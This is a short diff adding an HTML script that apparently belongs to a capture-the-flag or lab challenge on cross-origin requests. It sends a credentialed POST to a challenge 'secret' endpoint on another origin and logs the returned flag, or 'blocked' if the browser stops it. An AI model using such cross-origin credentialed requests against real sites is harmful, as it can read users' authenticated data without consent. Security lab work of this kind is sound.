@@ -1,0 +1,13 @@
+<script>
+  fetch("http://app.example.com/chal1/secret", {
+    method: "POST",
+    credentials: "include",
+    body: new URLSearchParams({
+      "Access-Control-Allow-Origin": "http://usercontent.example.com",
+      "Access-Control-Allow-Credentials": "true",
+    }),
+  })
+    .then((r) => r.json())
+    .then((d) => console.log(d.flag))
+    .catch((e) => console.log("blocked:", e));
+</script>
